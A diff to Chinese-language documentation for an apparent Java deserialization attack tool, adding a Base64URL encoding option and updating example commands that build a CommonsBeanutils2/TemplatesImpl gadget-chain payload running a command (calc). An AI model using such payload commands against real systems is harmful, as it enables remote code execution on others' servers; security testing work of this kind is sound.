@@ -59,12 +59,18 @@ YsoAttack模块设定的额外参数：
 
 描述：使用encode参数对Java序列化数据进行编码，支持Base64编码，Hex编码输出
 
-工具：-encode="Base64" 或者 -encode="Hex" 即可
+工具：
+
+- -encode="Base64" ：标准的Base64编码，会带有`+`，`/`特殊符号
+- -encode="Base64URL" ：URL/文件名安全的Base64编码，`+`和`/`分别替换为`-`和`_`
+-  -encode="Hex" ：十六进制编码
 
 ```java
--m YsoAttack -g CommonsBeanutils2 -a "Templateslmpl:auto_cmd:calc" -encode "Base64"
+-m YsoAttack -g CommonsBeanutils2 -a "Templateslmpl:auto_cmd:calc" -encode="Base64URL"
 
--m YsoAttack -g CommonsBeanutils2 -a "Templateslmpl:auto_cmd:calc" -encode "Hex"
+-m YsoAttack -g CommonsBeanutils2 -a "Templateslmpl:auto_cmd:calc" -encode="Base64"
+
+-m YsoAttack -g CommonsBeanutils2 -a "Templateslmpl:auto_cmd:calc" -encode="Hex"
 ```
 
 #### TemplatesImpl 利用链压缩
